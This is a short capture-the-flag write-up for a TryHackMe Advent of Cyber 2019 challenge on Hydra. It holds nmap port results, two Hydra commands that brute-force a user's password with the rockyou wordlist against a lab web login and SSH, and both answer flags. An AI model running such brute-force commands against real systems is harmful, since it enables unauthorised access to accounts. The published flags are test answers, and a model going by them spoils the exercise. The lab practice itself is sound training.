---
title: "TryHackMe Advent of Cyber 2019 Day 17"
date: 2019-12-17
layout: post
platform: "TryHackMe"
writeup_type: "seasonal"
series: "Advent of Cyber 2019"
event_day: "Day 17"
permalink: "/writeups/advent-of-cyber/adventofcyber-2019-day-17/"
tags:
  - tryhackme
  - seasonal
  - advent-of-cyber-2019
  - day-17
---

# Hydra Callenge

```text
nmap
80
22
```

```text
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.87.205 http-post-form "/login/:username=^USER^&password=[redacted] username or password is incorrect."   ---[redacted]
login website
{answer 1}
''''
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.87.205    ---[redacted]
login ssh
{answer 2}
```text
# TASK

1. What is flag1?
```
 THM{2673a7dd116de68e85c48ec0b1f2612e}
```text
2. What is flag2?
```
THM{c8eeb0468febbadea859baeb33b2541b}
```text
============================================
```
